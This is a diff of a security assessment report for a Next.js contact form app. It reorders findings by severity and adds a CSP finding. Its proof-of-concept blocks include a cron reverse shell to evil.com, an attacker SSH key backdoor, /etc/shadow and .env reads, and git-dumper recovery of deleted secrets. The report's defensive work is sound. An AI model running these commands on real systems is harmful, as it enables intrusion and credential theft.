@@ -8,13 +8,13 @@
 
 A full-stack security assessment was conducted on the deployed Next.js contact form application. The assessment covered source code review, network-level configuration, black-box endpoint testing against the live HTTPS deployment, and automated scanning with OWASP ZAP.
 
-**Sixteen vulnerabilities** were identified across the following severity ratings:
+**Seventeen vulnerabilities** were identified across the following severity ratings:
 
 | Severity | Count |
 |---|---|
 | 🔴 Critical | 2 |
 | 🔴 High | 4 |
-| 🟠 Medium | 8 |
+| 🟠 Medium | 9 |
 | ℹ️ Informational | 2 |
 
 The most severe finding allows an attacker to flood the business owner's inbox with thousands of spam emails at zero cost, with no server-side controls to prevent it. A second critical finding reveals that running the application as a root-equivalent process gives any attacker who exploits even a minor bug complete control over the server and all secrets stored on it.
@@ -27,7 +27,42 @@ All findings include working proof-of-concept commands tested against the live d
 
 ---
 
-## 2. Vulnerability Findings
+## 2. Summary Table
+
+| ID | Vulnerability | OWASP | File | Severity | Status |
+|---|---|---|---|---|---|
+| V-001 | No Rate Limiting | A05:2021 | `route.ts` | 🔴 Critical | Fixed in route.ts |
+| V-007 | Application Running as Root | A05:2021 | Server setup | 🔴 Critical | Fixed — runs as devops |
+| V-002 | Email Header Injection | A03:2021 | `route.ts` | 🔴 High | Fixed in route.ts |
+| V-005 | .git Directory Exposed | A05:2021 | Nginx config | 🔴 High | Fixed in Nginx |
+| V-008 | Missing Input Validation | A03:2021 | `route.ts` | 🔴 High | Fixed in route.ts |
+| V-009 | Next.js RSC RCE Risk | A03:2021 | Framework | 🔴 High | Fixed — upgraded Next.js |
+| V-003 | Sensitive Error Disclosure | A05:2021 | `route.ts` L43,51 | 🟠 Medium | Fixed in route.ts |
+| V-004 | HTML Injection in Email Body | A03:2021 | `route.ts` L68-71 | 🟠 Medium | Fixed in route.ts |
+| V-006 | Clickjacking — No Frame Headers | A05:2021 | Nginx / `next.config.ts` | 🟠 Medium | Fixed in next.config.ts |
+| V-010 | CSP: script-src unsafe-eval | A05:2021 | `next.config.ts` | 🟠 Medium | Framework constraint — tracked |
+| V-011 | CSP: script-src unsafe-inline | A05:2021 | `next.config.ts` | 🟠 Medium | Framework constraint — tracked |
+| V-012 | CSP: style-src unsafe-inline | A05:2021 | `next.config.ts` | 🟠 Medium | Framework constraint — tracked |
+| V-013 | SRI Attribute Missing | A08:2021 | HTML output | 🟠 Medium | False positive for own assets |
+| V-014 | Sensitive Info in URL | A01:2021 | Form component | 🟠 Medium | Verified — POST used, no leakage |
+| V-017 | CSP: No Fallback Directive | A05:2021 | `next.config.ts` | 🟠 Medium | Fixed in next.config.ts |
+| V-015 | Modern Web Application | — | — | ℹ️ Info | ZAP informational only |
+| V-016 | User Agent Fuzzer | — | — | ℹ️ Info | Consistent response confirmed |
+
+**Severity Scale:**
+- 🔴 Critical / High — immediate action required
+- 🟠 Medium — address within current sprint
+- ℹ️ Informational — no action required, documented for completeness
+
+---
+
+## 3. Vulnerability Findings
+
+Findings are ordered by severity: Critical → High → Medium → Informational.
+
+---
+
+## 🔴 CRITICAL
 
 ---
 
@@ -108,6 +143,62 @@ if (isRateLimited(ip)) {
 
 ---
 
+### V-007: Application Running as Root
+
+| Field              | Details                                          |
+|--------------------|--------------------------------------------------|
+| **Severity**       | 🔴 Critical                                      |
+| **OWASP Category** | A05:2021 — Security Misconfiguration             |
+| **Affected File**  | Server process configuration / PM2 startup       |
+| **Affected Line**  | PM2 or systemd service running as root           |
+| **CWE**            | CWE-250: Execution with Unnecessary Privileges   |
+
+#### Description
+
+If the PM2 process manager and the Next.js application are started under the root user, any code execution vulnerability in the application — however minor — immediately grants an attacker root-level privileges on the entire server. This violates the Principle of Least Privilege.
+
+#### Business Impact
+
+- Complete server compromise — all data, secrets, and configurations exposed
+- Attacker can create backdoor SSH keys, making the server persistently accessible even after the original vulnerability is patched
+- Server can be enlisted into a botnet for cryptocurrency mining or DDoS attacks, generating unexpected AWS costs
+- Recovery requires provisioning a completely new server — hours of downtime
+
+#### Proof of Concept
+
+```bash
+# Check if process runs as root (before fix):
+ps aux | grep node
+# BAD: root  1234  ... node /home/root/My-JS-Project/...
+
+# If RCE achieved as root, attacker can:
+cat /etc/shadow                                              # all OS password hashes
+echo "ssh-rsa ATTACKER_KEY" >> /root/.ssh/authorized_keys  # persistent backdoor
+echo "* * * * * root bash -i >& /dev/tcp/evil.com/4444 0>&1" >> /etc/cron.d/shell
+cat /home/devops/My-JS-Project/.env.production             # all API keys exposed
+
+# Good output after fix:
+ps aux | grep node
+# devops  1234  ... node ...  ← non-root confirmed
+```
+
+#### Recommended Fix (Already Applied)
+
+```bash
+# Confirmed — app runs as devops user:
+id devops
+# uid=1001(devops) gid=1001(devops) groups=1001(devops),27(sudo)
+
+pm2 list
+# Shows user: devops for all processes — NOT root
+```
+
+---
+
+## 🔴 HIGH
+
+---
+
 ### V-002: Email Header Injection
 
 | Field              | Details                                              |
@@ -152,6 +243,171 @@ function sanitize(value: string, max = 200): string {
 }
 // All fields pass through sanitize() before being used in email construction
 ```
+
+---
+
+### V-005: Git Directory Publicly Exposed
+
+| Field              | Details                                          |
+|--------------------|--------------------------------------------------|
+| **Severity**       | 🔴 High                                          |
+| **OWASP Category** | A05:2021 — Security Misconfiguration             |
+| **Affected File**  | Nginx configuration                              |
+| **Affected Line**  | Missing `location ~ /\.git` deny block           |
+| **CWE**            | CWE-538: File and Directory Information Exposure |
+
+#### Description
+
+The `.git` directory is present in the application's document root and is not blocked by the web server. When a repository is deployed by cloning directly, the full `.git/` folder is included on disk. Without an explicit deny rule, Nginx serves this directory's contents as static files. An attacker can use tools like `git-dumper` or `GitHack` to reconstruct the entire source code repository — including commit history and any secrets ever committed, even if later deleted.
+
+#### Business Impact
+
+- Complete application source code disclosure
+- Historical commits may contain hardcoded API keys or credentials that were "removed" but remain in git history and are fully recoverable
+- Attacker gains deep knowledge of the application, accelerating further exploitation
+- `.git/config` exposes the GitHub repository URL
+
+#### Proof of Concept
+
+```bash
+# Step 1: Verify .git/config is accessible
+curl https://myjavascriptapp.duckdns.org/.git/config
+# If vulnerable: returns raw git config with [remote "origin"] URL
+
+# Step 2: Reconstruct full repository
+pip install git-dumper
+git-dumper https://myjavascriptapp.duckdns.org/.git/ ./stolen-source-code
+
+# Step 3: Review old commits for deleted secrets
+git -C ./stolen-source-code log --oneline
+git -C ./stolen-source-code show HEAD~5:.env
+```
+
+#### Recommended Fix (Already Applied in Nginx)
+
+```nginx
+location ~ /\.git {
+    deny all;
+    return 404;
+}
+location ~ /\.env {
+    deny all;
+    return 404;
+}
+```
+
+**Verify:**
+```bash
+curl -I https://myjavascriptapp.duckdns.org/.git/config
+# Expected: HTTP/2 404
+```
+
+---
+
+### V-008: Missing Input Validation and Sanitization
+
+| Field              | Details                                              |
+|--------------------|------------------------------------------------------|
+| **Severity**       | 🔴 High                                              |
+| **OWASP Category** | A03:2021 — Injection                                 |
+| **Affected File**  | `app/api/sendgrid/route.ts`                          |
+| **Affected Line**  | All lines reading from `req.body` without validation |
+| **CWE**            | CWE-20: Improper Input Validation                    |
+
+#### Description
+
+Without server-side schema validation, all form fields are accepted regardless of type, format, or size. This creates type confusion risks (fields could be arrays or objects), oversized payload risks (memory exhaustion), and XSS-in-email risks if HTML templates are ever introduced.
+
+#### Business Impact
+
+- Malformed data in the business owner's inbox makes it difficult to respond to real enquiries
+- Large payloads can exhaust memory or cause application crashes (Denial of Service)
+- Future HTML email templates inherit unvalidated data, creating stored XSS risk in email clients
+
+#### Proof of Concept
+
+```bash
+# PoC 1: Invalid data accepted with no rejection
+curl -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
+  -H "Content-Type: application/json" \
+  -d '{"name":12345,"email":"not-an-email","phone":"HELLO","message":"x"}'
+# Without fix: 200 OK — accepted and emailed
+
+# PoC 2: Oversized payload — no size limit
+python3 -c "
+import json
+payload = {'name':'A'*10000,'email':'test@test.com','phone':'1234567890','message':'B'*100000}
+print(json.dumps(payload))
+" | curl -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
+  -H "Content-Type: application/json" -d @-
+# Without fix: 200 OK — 110KB payload forwarded to SendGrid
+```
+
+#### Recommended Fix (Already Applied in route.ts)
+
+```typescript
+const ContactSchema = z.object({
+  name:    z.string().min(2).max(100).regex(/^[a-zA-Z\s'-]+$/, 'Invalid name'),
+  email:   z.string().email('Invalid email').max(254),
+  phone:   z.string().regex(/^\+?[\d\s\-().]{7,20}$/, 'Invalid phone number'),
+  message: z.string().min(10, 'Message too short').max(2000, 'Message too long'),
+});
+```
+
+---
+
+### V-009: Remote Code Execution Risk — Next.js RSC (React2Shell)
+
+| Field              | Details                                               |
+|--------------------|-------------------------------------------------------|
+| **Severity**       | 🔴 High                                               |
+| **OWASP Category** | A03:2021 — Injection                                  |
+| **Affected File**  | Framework-level — Next.js React Server Components     |
+| **Affected Line**  | RSC payload handler (`["$1:a"]` marker)               |
+| **CWE**            | CWE-94: Improper Control of Code Generation           |
+
+#### Description
+
+The application was running a vulnerable version of Next.js that uses React Server Components (RSC). Improper handling of specially crafted requests allows attackers to manipulate server-side rendering logic, potentially leading to Remote Code Execution (RCE).
+
+#### Business Impact
+
+- Execution of arbitrary code on the server
+- Access to sensitive environment variables (API keys, secrets)
+- Server compromise, unauthorized access, and potential full system takeover
+
+#### Proof of Concept
+
+```bash
+curl "https://myjavascriptapp.duckdns.org/?email=test@example.com&message=test"
+# Response confirms server processes malformed RSC input — indicating a possible execution path
+```
+
+#### Recommended Fix
+
+```bash
+# Upgrade Next.js and React:
+npm install next@latest react@latest react-dom@latest
+```
+
+Update `package.json`:
+```json
+"next": "15.1.9",
+"react": "19.0.1",
+"react-dom": "19.0.1"
+```
+
+Update `deploy.yml`:
+```bash
+npm install --legacy-peer-deps
+# --legacy-peer-deps needed because react-day-picker@8.10.1 declares
+# peer dependency on React 18, but we are now on React 19.
+# Next.js 15 handles this fine at runtime.
+```
+
+---
+
+## 🟠 MEDIUM
 
 ---
 
@@ -265,71 +521,13 @@ const htmlMessage = escapeHtml(safeMessage);
 
 ---
 
-### V-005: Git Directory Publicly Exposed
-
-| Field              | Details                                          |
-|--------------------|--------------------------------------------------|
-| **Severity**       | 🔴 High                                          |
-| **OWASP Category** | A05:2021 — Security Misconfiguration             |
-| **Affected File**  | Nginx configuration                              |
-| **Affected Line**  | Missing `location ~ /\.git` deny block           |
-| **CWE**            | CWE-538: File and Directory Information Exposure |
-
-#### Description
-
-The `.git` directory is present in the application's document root and is not blocked by the web server. When a repository is deployed by cloning directly, the full `.git/` folder is included on disk. Without an explicit deny rule, Nginx serves this directory's contents as static files. An attacker can use tools like `git-dumper` or `GitHack` to reconstruct the entire source code repository — including commit history and any secrets ever committed, even if later deleted.
-
-#### Business Impact
-
-- Complete application source code disclosure
-- Historical commits may contain hardcoded API keys or credentials that were "removed" but remain in git history and are fully recoverable
-- Attacker gains deep knowledge of the application, accelerating further exploitation
-- `.git/config` exposes the GitHub repository URL
-
-#### Proof of Concept
-
-```bash
-# Step 1: Verify .git/config is accessible
-curl https://myjavascriptapp.duckdns.org/.git/config
-# If vulnerable: returns raw git config with [remote "origin"] URL
-
-# Step 2: Reconstruct full repository
-pip install git-dumper
-git-dumper https://myjavascriptapp.duckdns.org/.git/ ./stolen-source-code
-
-# Step 3: Review old commits for deleted secrets
-git -C ./stolen-source-code log --oneline
-git -C ./stolen-source-code show HEAD~5:.env
-```
-
-#### Recommended Fix (Already Applied in Nginx)
-
-```nginx
-location ~ /\.git {
-    deny all;
-    return 404;
-}
-location ~ /\.env {
-    deny all;
-    return 404;
-}
-```
-
-**Verify:**
-```bash
-curl -I https://myjavascriptapp.duckdns.org/.git/config
-# Expected: HTTP/2 404
-```
-
----
-
 ### V-006: Missing HTTP Security Headers — Clickjacking
 
 | Field              | Details                                              |
 |--------------------|------------------------------------------------------|
 | **Severity**       | 🟠 Medium                                            |
 | **OWASP Category** | A05:2021 — Security Misconfiguration                 |
-| **Affected File**  | Nginx configuration / `next.config.js`               |
+| **Affected File**  | `next.config.ts`                                     |
 | **Affected Line**  | Missing `headers()` configuration                    |
 | **CWE**            | CWE-1021: Improper Restriction of Rendered UI Layers |
 
@@ -364,173 +562,18 @@ Create `evil.html` and open in any browser:
 
 If the header is missing, the iframe loads with no browser warning and the attack works.
 
-#### Recommended Fix (Already Applied in Nginx)
+#### Recommended Fix (Applied in next.config.ts)
 
-```nginx
-add_header X-Frame-Options "DENY" always;
-add_header Content-Security-Policy "frame-ancestors 'none'" always;
-add_header X-Content-Type-Options "nosniff" always;
-add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+```typescript
+{ key: 'X-Frame-Options', value: 'DENY' },
+{ key: 'Content-Security-Policy', value: "... frame-ancestors 'none' ..." },
+{ key: 'X-Content-Type-Options', value: 'nosniff' },
+{ key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },
 ```
 
 **Verify:**
 ```bash
 curl -I https://myjavascriptapp.duckdns.org | grep -i -E "x-frame|content-security|strict-transport"
-```
-
----
-
-### V-007: Application Running as Root
-
-| Field              | Details                                          |
-|--------------------|--------------------------------------------------|
-| **Severity**       | 🔴 Critical                                      |
-| **OWASP Category** | A05:2021 — Security Misconfiguration             |
-| **Affected File**  | Server process configuration / PM2 startup       |
-| **Affected Line**  | PM2 or systemd service running as root           |
-| **CWE**            | CWE-250: Execution with Unnecessary Privileges   |
-
-#### Description
-
-If the PM2 process manager and the Next.js application are started under the root user, any code execution vulnerability in the application — however minor — immediately grants an attacker root-level privileges on the entire server. This violates the Principle of Least Privilege.
-
-#### Business Impact
-
-- Complete server compromise — all data, secrets, and configurations exposed
-- Attacker can create backdoor SSH keys, making the server persistently accessible even after the original vulnerability is patched
-- Server can be enlisted into a botnet for cryptocurrency mining or DDoS attacks, generating unexpected AWS costs
-- Recovery requires provisioning a completely new server — hours of downtime
-
-#### Proof of Concept
-
-```bash
-# Check if process runs as root (before fix):
-ps aux | grep node
-# BAD: root  1234  ... node /home/root/My-JS-Project/...
-
-# If RCE achieved as root, attacker can:
-cat /etc/shadow                                              # all OS password hashes
-echo "ssh-rsa ATTACKER_KEY" >> /root/.ssh/authorized_keys  # persistent backdoor
-echo "* * * * * root bash -i >& /dev/tcp/evil.com/4444 0>&1" >> /etc/cron.d/shell
-cat /home/devops/My-JS-Project/.env.production             # all API keys exposed
-
-# Good output after fix:
-ps aux | grep node
-# devops  1234  ... node ...  ← non-root confirmed
-```
-
-#### Recommended Fix (Already Applied)
-
-```bash
-# Confirmed — app runs as devops user:
-id devops
-# uid=1001(devops) gid=1001(devops) groups=1001(devops),27(sudo)
-
-pm2 list
-# Shows user: devops for all processes — NOT root
-```
-
----
-
-### V-008: Missing Input Validation and Sanitization
-
-| Field              | Details                                              |
-|--------------------|------------------------------------------------------|
-| **Severity**       | 🔴 High                                              |
-| **OWASP Category** | A03:2021 — Injection                                 |
-| **Affected File**  | `app/api/sendgrid/route.ts`                          |
-| **Affected Line**  | All lines reading from `req.body` without validation |
-| **CWE**            | CWE-20: Improper Input Validation                    |
-
-#### Description
-
-Without server-side schema validation, all form fields are accepted regardless of type, format, or size. This creates type confusion risks (fields could be arrays or objects), oversized payload risks (memory exhaustion), and XSS-in-email risks if HTML templates are ever introduced.
-
-#### Business Impact
-
-- Malformed data in the business owner's inbox makes it difficult to respond to real enquiries
-- Large payloads can exhaust memory or cause application crashes (Denial of Service)
-- Future HTML email templates inherit unvalidated data, creating stored XSS risk in email clients
-
-#### Proof of Concept
-
-```bash
-# PoC 1: Invalid data accepted with no rejection
-curl -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
-  -H "Content-Type: application/json" \
-  -d '{"name":12345,"email":"not-an-email","phone":"HELLO","message":"x"}'
-# Without fix: 200 OK — accepted and emailed
-
-# PoC 2: Oversized payload — no size limit
-python3 -c "
-import json
-payload = {'name':'A'*10000,'email':'test@test.com','phone':'1234567890','message':'B'*100000}
-print(json.dumps(payload))
-" | curl -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
-  -H "Content-Type: application/json" -d @-
-# Without fix: 200 OK — 110KB payload forwarded to SendGrid
-```
-
-#### Recommended Fix (Already Applied in route.ts)
-
-```typescript
-const ContactSchema = z.object({
-  name:    z.string().min(2).max(100).regex(/^[a-zA-Z\s'-]+$/, 'Invalid name'),
-  email:   z.string().email('Invalid email').max(254),
-  phone:   z.string().regex(/^\+?[\d\s\-().]{7,20}$/, 'Invalid phone number'),
-  message: z.string().min(10, 'Message too short').max(2000, 'Message too long'),
-});
-```
-
----
-
-### V-009: Remote Code Execution Risk — Next.js RSC (React2Shell)
-
-| Field              | Details                                               |
-|--------------------|-------------------------------------------------------|
-| **Severity**       | 🔴 High                                               |
-| **OWASP Category** | A03:2021 — Injection                                  |
-| **Affected File**  | Framework-level — Next.js React Server Components     |
-| **Affected Line**  | RSC payload handler (`["$1:a"]` marker)               |
-| **CWE**            | CWE-94: Improper Control of Code Generation           |
-
-#### Description
-
-The application was running a vulnerable version of Next.js that uses React Server Components (RSC). Improper handling of specially crafted requests allows attackers to manipulate server-side rendering logic, potentially leading to Remote Code Execution (RCE).
-
-#### Business Impact
-
-- Execution of arbitrary code on the server
-- Access to sensitive environment variables (API keys, secrets)
-- Server compromise, unauthorized access, and potential full system takeover
-
-#### Proof of Concept
-
-```bash
-curl "https://myjavascriptapp.duckdns.org/?email=test@example.com&message=test"
-# Response confirms server processes malformed RSC input — indicating a possible execution path
-```
-
-#### Recommended Fix
-
-```bash
-# Upgrade Next.js and React:
-npm install next@latest react@latest react-dom@latest
-```
-
-Update `package.json`:
-```json
-"next": "15.1.9",
-"react": "19.0.1",
-"react-dom": "19.0.1"
-```
-
-Update `deploy.yml`:
-```bash
-npm install --legacy-peer-deps
-# --legacy-peer-deps needed because react-day-picker@8.10.1 declares
-# peer dependency on React 18, but we are now on React 19.
-# Next.js 15 handles this fine at runtime.
 ```
 
 ---
@@ -707,6 +750,66 @@ router.push('/thank-you');                    // correct
 
 ---
 
+### V-017: CSP — Failure to Define Directive with No Fallback
+
+| Field              | Details                                    |
+|--------------------|--------------------------------------------|
+| **Severity**       | 🟠 Medium                                  |
+| **OWASP Category** | A05:2021 — Security Misconfiguration       |
+| **Affected File**  | `next.config.ts` — Content-Security-Policy |
+| **CWE**            | CWE-693                                    |
+| **Source**         | OWASP ZAP Passive Scan (Alert 10055-13)    |
+| **WASC ID**        | 15                                         |
+
+#### Description
+
+The Content Security Policy was missing directives that do **not** fall back to `default-src` in all browsers. Unlike most CSP directives, `form-action`, `worker-src`, `manifest-src`, and `media-src` must be declared explicitly — omitting them is equivalent to allowing anything for those resource types.
+
+ZAP evidence showed `frame-ancestors 'none'` was present but `form-action` and the other non-inheriting directives were absent. This means form submissions could be redirected to arbitrary external URLs, and web workers or media resources were unrestricted.
+
+#### Business Impact
+
+- Without `form-action 'self'`, an attacker who achieves any DOM manipulation can redirect form submissions to a malicious server, capturing user PII silently
+- Without `worker-src 'none'`, malicious scripts (if injected via XSS) can spawn background workers to run cryptominers or exfiltrate data
+- The missing directives create exploitable gaps even when `default-src 'self'` is set
+
+#### Proof of Concept
+
+```bash
+# ZAP passive scan evidence (before fix):
+# Alert: CSP: Failure to Define Directive with No Fallback
+# URL: https://myjavascriptapp.duckdns.org/robots.txt
+# Risk: Medium | Confidence: High
+# Parameter: Content-Security-Policy
+# Evidence: frame-ancestors 'none'
+# Other Info: The directive(s): form-action is/are among the directives
+#             that do not fallback to default-src.
+# CWE ID: 693 | WASC ID: 15 | Alert Ref: 10055-13
+```
+
+#### Recommended Fix (Applied in next.config.ts)
+
+The following directives were added to the CSP header in `next.config.ts`:
+
+```typescript
+"form-action 'self'",      // restricts form submissions to same origin
+"worker-src 'none'",       // no Web Workers needed in this app
+"manifest-src 'self'",     // PWA manifest served from same origin
+"media-src 'none'",        // no audio/video used in this app
+```
+
+**Verify:**
+```bash
+curl -I https://myjavascriptapp.duckdns.org | grep -i content-security-policy
+# Expected: form-action 'self'; worker-src 'none'; manifest-src 'self'; media-src 'none'
+```
+
+---
+
+## ℹ️ INFORMATIONAL
+
+---
+
 ### V-015: Modern Web Application — Informational
 
 | Field              | Details                   |
@@ -739,7 +842,7 @@ ZAP probed the application with a range of unusual or malformed User-Agent strin
 
 ---
 
-## 3. Threat Scenario Analysis
+## 4. Threat Scenario Analysis
 
 ---
 
@@ -837,36 +940,6 @@ cat /home/devops/My-JS-Project/.env.production                  # all API keys
 ```bash
 ps aux | grep node   # shows devops, not root
 ```
-
----
-
-## 4. Summary Table
-
-| ID | Vulnerability | OWASP | File | Severity | Status |
-|---|---|---|---|---|---|
-| V-001 | No Rate Limiting | A05:2021 | `route.ts` | 🔴 Critical | Fixed in route.ts |
-| V-002 | Email Header Injection | A03:2021 | `route.ts` | 🔴 High | Fixed in route.ts |
-| V-003 | Sensitive Error Disclosure | A05:2021 | `route.ts` L43,51 | 🟠 Medium | Fixed in route.ts |
-| V-004 | HTML Injection in Email Body | A03:2021 | `route.ts` L68-71 | 🟠 Medium | Fixed in route.ts |
-| V-005 | .git Directory Exposed | A05:2021 | Nginx config | 🔴 High | Fixed in Nginx |
-| V-006 | Clickjacking — No Frame Headers | A05:2021 | Nginx config | 🟠 Medium | Fixed in Nginx |
-| V-007 | Application Running as Root | A05:2021 | Server setup | 🔴 Critical | Fixed — runs as devops |
-| V-008 | Missing Input Validation | A03:2021 | `route.ts` | 🔴 High | Fixed in route.ts |
-| V-009 | Next.js RSC RCE Risk | A03:2021 | Framework | 🔴 High | Fixed — upgraded Next.js |
-| V-010 | CSP: script-src unsafe-eval | A05:2021 | `next.config.ts` | 🟠 Medium | Framework constraint — tracked |
-| V-011 | CSP: script-src unsafe-inline | A05:2021 | `next.config.ts` | 🟠 Medium | Framework constraint — tracked |
-| V-012 | CSP: style-src unsafe-inline | A05:2021 | `next.config.ts` | 🟠 Medium | Framework constraint — tracked |
-| V-013 | SRI Attribute Missing | A08:2021 | HTML output | 🟠 Medium | False positive for own assets |
-| V-014 | Sensitive Info in URL | A01:2021 | Form component | 🟠 Medium | Verified — POST used, no leakage |
-| V-015 | Modern Web Application | — | — | ℹ️ Info | ZAP informational only |
-| V-016 | User Agent Fuzzer | — | — | ℹ️ Info | Consistent response confirmed |
-
----
-
-**Severity Scale:**
-- 🔴 Critical / High — immediate action required
-- 🟠 Medium — address within current sprint
-- ℹ️ Informational — no action required, documented for completeness
 
 ---
 
